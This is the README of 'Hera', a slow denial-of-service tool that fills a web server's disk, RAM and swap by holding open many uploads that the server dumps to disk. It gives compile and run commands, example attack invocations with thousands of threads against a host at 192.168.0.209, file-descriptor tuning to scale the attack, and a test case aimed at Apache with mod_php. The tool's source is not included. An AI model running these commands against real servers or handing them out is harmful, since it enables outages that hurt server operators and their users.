# Hera 0.8
## Description
Hera is a slow denial of service tool that exploits the fact that some web servers will dump files to disk by default as they are being uploaded (sometimes even if the hosted application has not implemented file upload). This makes it possible to use up disk space and sometimes RAM/Swap. Different servers will respond differently to this but in many cases it leads to instability and/or crash of the system.
## Usage
###### Compiling
```
g++ -std=c++11 -pthread main.cpp -o hera -lz
```
###### Running
```
./hera host port threads connections path filesize files endfile gzip timeout 
./hera 192.168.0.209 80 5000 3 /test.php 0.03 20 0 0 20
```
###### Increasing file descriptor limit
vim /etc/security/limits.conf
```
* soft nofile 65000
* hard nofile 65000
root soft nofile 65000
root hard nofile 65000
```

Restart or relog.
###### Test case 1
Apache 2.4.x running with mod_php enabled and a mode that is not limited by a low amount of threads (in which case this would become a normal slowloris like attack).
The tool must be run towards a php file for mod_php to be called and the files to be dumped to disk.
The following usage example would start an attack against IP 192.168.0.209 on port 80 and the script test.php.
5000 threads would be opened with 3 sockets in each, resulting in 15000x20=300000 files (0.3 MB each, that's 90000 MB) being dumped to disk.
Disk space, RAM and Swap will run out, it depends on the setup which one fails first of course.

```
./hera 192.168.0.209 80 5000 3 /test.php 0.3 20 0 0 120
```
